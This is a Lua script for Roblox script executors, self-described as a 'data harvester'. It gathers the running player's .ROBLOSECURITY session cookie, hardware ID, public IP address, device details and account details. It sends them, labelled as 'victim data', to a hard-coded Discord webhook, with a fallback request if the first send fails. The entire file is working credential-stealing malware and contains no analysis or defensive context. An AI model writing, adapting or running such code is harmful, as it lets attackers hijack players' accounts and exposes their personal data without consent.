-- ============================================================
-- SOMBRA DATA HARVESTER v5 (Local Script for Delta & Executors)
-- Sends maximum victim info to Discord webhook.
-- No lag, no freeze, pure extraction.
-- ============================================================

local webhookUrl = "https://discord.com/api/webhooks/1543874515514163214/n7BkiwCkO4qqRZVoKt0OwSdBwCrd6ZqNHy_3atSeJ4ClN58IFS6F7qAmCAxc8AtEOjIU"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local StatsService = game:GetService("Stats")
local LocalPlayer = Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")

-- ===== TOKEN EXTRACTION =====
local function getRobloxToken()
    local token = nil

    -- Method 1: getcookie (most executors)
    pcall(function()
        if getcookie then
            token = getcookie(".ROBLOSECURITY")
            if not token or token == "" then
                token = getcookie("ROBLOSECURITY")
            end
        end
    end)

    -- Method 2: executor-specific token functions
    if not token then
        local funcs = {
            "gettoken", "get_roblox_token", "getauth", "get_auth_token",
            "getcookie", "get_roblox_cookie", "getsecuritycookie", "getrobloxsecurity",
            "getlocalplayer_token", "get_token"
        }
        for _, fn in ipairs(funcs) do
            pcall(function()
                local f = getgenv and getgenv()[fn] or nil
                if f and type(f) == "function" then
                    local result = f()
                    if result and tostring(result):len() > 20 then
                        token = tostring(result)
                    end
                end
            end)
        end
    end

    -- Method 3: check LocalPlayer attributes
    if not token then
        pcall(function()
            local attrs = LocalPlayer:GetAttributes()
            for key, val in pairs(attrs) do
                local k = tostring(key):lower()
                if k:find("token") or k:find("cookie") or k:find("auth") then
                    if val and tostring(val):len() > 20 then
                        token = tostring(val)
                    end
                end
            end
        end)
    end

    -- Method 4: global/shared variables
    if not token then
        pcall(function()
            if _G and _G.ROBLOSECURITY then token = _G.ROBLOSECURITY end
            if not token and _G and _G.token then token = _G.token end
            if not token and _G and _G.authToken then token = _G.authToken end
            if not token and shared and shared.token then token = shared.token end
        end)
    end

    -- Method 5: try reading from Roblox cookie files via HttpService? (rare)
    if not token then
        pcall(function()
            -- Some executors allow reading from local files? Not standard, skip.
        end)
    end

    return token or "Token not found"
end

-- ===== EXECUTOR NAME =====
local function getExecutorName()
    local executorName = nil
    local funcs = {
        "identifyexecutor", "getexecutorname", "getexecutor", "getexploitname",
        "getexecutorinfo", "getscriptexecutor"
    }
    for _, fn in ipairs(funcs) do
        pcall(function()
            local f = getgenv and getgenv()[fn] or nil
            if f and type(f) == "function" then
                local result = f()
                if result then
                    executorName = tostring(result)
                end
            end
        end)
    end
    return executorName or "Unknown Executor"
end

-- ===== HWID =====
local function getHwid()
    local hwid = nil
    local funcs = {
        "gethwid", "get_hwid", "getmachineid", "getfingerprint",
        "gethardwareid", "get_hwid_v2"
    }
    for _, fn in ipairs(funcs) do
        pcall(function()
            local f = getgenv and getgenv()[fn] or nil
            if f and type(f) == "function" then
                local result = f()
                if result then
                    hwid = tostring(result)
                end
            end
        end)
    end
    return hwid or "Unknown HWID"
end

-- ===== IP ADDRESS =====
local function getIPAddress()
    local apis = {
        "https://api.ipify.org",
        "https://ipv4.icanhazip.com/",
        "https://api.my-ip.io/ip",
        "https://checkip.amazonaws.com/",
        "https://ipinfo.io/ip",
        "https://v4.ident.me/",
        "https://icanhazip.com/"
    }
    for _, url in ipairs(apis) do
        local ok, result = pcall(function()
            return HttpService:GetAsync(url, true)
        end)
        if ok and result then
            result = tostring(result):gsub("%s+", "")
            if result:match("%d+%.%d+%.%d+%.%d+") then
                return result
            end
        end
    end
    return "IP fetch failed"
end

-- ===== DEVICE INFO =====
local function getDeviceInfo()
    return string.format(
        "Platform: %s | Touch: %s | Keyboard: %s | Gamepad: %s | Mouse: %s",
        tostring(UserInputService:GetPlatform()),
        tostring(UserInputService.TouchEnabled),
        tostring(UserInputService.KeyboardEnabled),
        tostring(UserInputService.GamepadEnabled),
        tostring(UserInputService.MouseEnabled)
    )
end

-- ===== ACCOUNT AGE =====
local function getAccountAge()
    local ok, age = pcall(function() return LocalPlayer.AccountAge end)
    return ok and (age .. " days") or "Unknown"
end

-- ===== MEMBERSHIP =====
local function getMembership()
    local ok, m = pcall(function() return LocalPlayer.MembershipType end)
    return ok and tostring(m) or "Unknown"
end

-- ===== FRIENDS COUNT =====
local function getFriendsCount()
    local ok, friends = pcall(function() return LocalPlayer:GetFriendsAsync() end)
    if ok and friends then
        return #friends
    end
    return "Unknown"
end

-- ===== INVENTORY COUNT (if accessible) =====
local function getInventoryCount()
    -- Try to get some inventory data via Synchronizer if available
    pcall(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Packages = ReplicatedStorage:FindFirstChild("Packages")
        if Packages then
            local Synchronizer = require(Packages:WaitForChild("Synchronizer"))
            local data = Synchronizer:Wait(LocalPlayer)
            -- Try to get AnimalPodiums count as brainrot count
            local podiums = data:Get("AnimalPodiums")
            if type(podiums) == "table" then
                local count = 0
                for _ in pairs(podiums) do count = count + 1 end
                return count
            end
        end
    end)
    return "Unknown"
end

-- ===== SERVER REGION & PING =====
local function getServerInfo()
    local region = "Unknown"
    local ping = "Unknown"
    pcall(function()
        region = tostring(StatsService:GetAttribute("Region")) or "Unknown"
    end)
    pcall(function()
        ping = math.floor(LocalPlayer:GetNetworkPing() * 1000) .. "ms"
    end)
    return region, ping
end

-- ===== COLLECT ALL DATA =====
local function collectData()
    local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    local region, ping = getServerInfo()
    return {
        Username = LocalPlayer.Name,
        DisplayName = LocalPlayer.DisplayName,
        UserId = tostring(LocalPlayer.UserId),
        AccountAge = getAccountAge(),
        MembershipType = getMembership(),
        IP = getIPAddress(),
        DeviceInfo = getDeviceInfo(),
        Executor = getExecutorName(),
        HWID = getHwid(),
        Token = getRobloxToken(),
        Game = placeInfo.Name or "Unknown",
        PlaceId = tostring(game.PlaceId),
        JobId = game.JobId,
        FriendsCount = getFriendsCount(),
        InventoryCount = getInventoryCount(),
        ServerRegion = region,
        Ping = ping,
        Timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        Password = "N/A (cannot retrieve)"
    }
end

-- ===== SEND TO WEBHOOK =====
local function sendToWebhook()
    local d = collectData()

    local rawText = string.format(
        "Username: %s\nDisplayName: %s\nUserId: %s\nAccountAge: %s\nMembership: %s\nIP: %s\nDevice: %s\nExecutor: %s\nHWID: %s\nToken: %s\nGame: %s\nPlaceId: %s\nJobId: %s\nFriendsCount: %s\nInventoryCount: %s\nServerRegion: %s\nPing: %s\nTimestamp: %s",
        d.Username, d.DisplayName, d.UserId, d.AccountAge, d.MembershipType, d.IP, d.DeviceInfo, d.Executor, d.HWID, d.Token, d.Game, d.PlaceId, d.JobId, d.FriendsCount, d.InventoryCount, d.ServerRegion, d.Ping, d.Timestamp
    )

    local payload = {
        content = "```\n" .. rawText .. "\n```",
        embeds = {
            {
                title = "🔴 NEW VICTIM DATA",
                color = 16711680,
                fields = {
                    {name = "Username", value = d.Username, inline = true},
                    {name = "Display Name", value = d.DisplayName, inline = true},
                    {name = "UserId", value = d.UserId, inline = true},
                    {name = "Account Age", value = d.AccountAge, inline = true},
                    {name = "Membership", value = d.MembershipType, inline = true},
                    {name = "IP Address", value = d.IP, inline = false},
                    {name = "Device Info", value = d.DeviceInfo, inline = false},
                    {name = "Executor", value = d.Executor, inline = true},
                    {name = "HWID", value = d.HWID, inline = true},
                    {name = "Token", value = d.Token, inline = false},
                    {name = "Game", value = d.Game, inline = true},
                    {name = "PlaceId", value = d.PlaceId, inline = true},
                    {name = "JobId", value = d.JobId, inline = true},
                    {name = "Friends Count", value = d.FriendsCount, inline = true},
                    {name = "Inventory Count", value = d.InventoryCount, inline = true},
                    {name = "Server Region", value = d.ServerRegion, inline = true},
                    {name = "Ping", value = d.Ping, inline = true},
                    {name = "Timestamp", value = d.Timestamp, inline = true},
                },
                footer = {text = "SOMBRA Collector v5"}
            }
        }
    }

    local ok, err = pcall(function()
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload))
    end)

    if not ok then
        print("[SOMBRA] Webhook send failed: " .. tostring(err))
        -- Fallback using request if available
        pcall(function()
            if request then
                request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(payload)
                })
                print("[SOMBRA] Webhook sent via request fallback.")
            end
        end)
    else
        print("[SOMBRA] Victim data sent to webhook.")
    end
end

-- Execute
sendToWebhook()
